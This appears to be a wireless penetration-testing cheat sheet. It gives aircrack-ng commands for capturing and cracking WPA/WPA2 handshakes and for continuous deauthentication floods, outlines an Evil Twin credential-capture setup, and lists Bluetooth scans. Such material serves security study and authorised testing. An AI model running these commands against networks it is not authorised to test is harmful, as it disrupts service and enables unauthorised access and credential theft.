# Wireless Attacks

Wi-Fi cracking, Evil Twin, Bluetooth recon.

## Wi-Fi Cracking (WPA/WPA2-PSK)

Cracking WPA/WPA2-PSK (Pre-Shared Key) networks typically involves capturing the 4-way handshake and then using a brute-force or dictionary attack against it.

* **Monitor Mode:** To capture wireless traffic, your wireless adapter must be put into monitor mode.

    ```bash
    airmon-ng start wlan0
    ```

    *Replace `wlan0` with your wireless interface name.*

* **Capture Handshake:** Use `airodump-ng` to scan for access points and capture the WPA/WPA2 handshake when a client connects or re-authenticates.

    ```bash
    airodump-ng -c <channel> --bssid <AP_MAC> -w <output_file> wlan0mon
    ```

  * `-c`: Specify the channel of the target AP.
  * `--bssid`: Specify the BSSID (MAC address) of the target AP.
  * `-w`: Write captured packets to a file.
  * `wlan0mon`: Your wireless interface in monitor mode.

* **Deauthentication Attack:** This attack disconnects clients from an access point, forcing them to re-authenticate and thus generating a new 4-way handshake that can be captured.

    ```bash
    aireplay-ng --deauth 0 -a <AP_MAC> -c <Client_MAC> wlan0mon
    ```

  * `--deauth 0`: Send continuous deauthentication frames.
  * `-a`: BSSID of the access point.
  * `-c`: MAC address of a connected client (optional, but helps target specific clients).

* **Crack Handshake:** Use `aircrack-ng` with a wordlist to crack the captured handshake.

    ```bash
    aircrack-ng -w /path/to/wordlist.txt <output_file>.cap
    ```

  * `-w`: Specify the path to your wordlist.
  * `<output_file>.cap`: The `.cap` file captured by `airodump-ng`.

## Evil Twin Attack (Conceptual)

Rogue AP mimics a legit one, same SSID, to pull clients onto attacker-controlled infra.

* **Setup Fake AP:** `hostapd` for the AP, `dnsmasq` for DHCP/DNS.
* **Deauthenticate Legitimate Clients:** same deauth technique as above, forces clients onto the fake AP.
* **Capture Credentials:** captive portal or unencrypted-traffic sniffing once clients connect.

## Bluetooth Reconnaissance

* **Scan for Devices:** `hcitool` for classic Bluetooth.

    ```bash
    hcitool scan
    ```

* **Bluetooth Low Energy (BLE) Scan:** `bluetoothctl` for BLE devices.

    ```bash
    bluetoothctl scan on
    ```
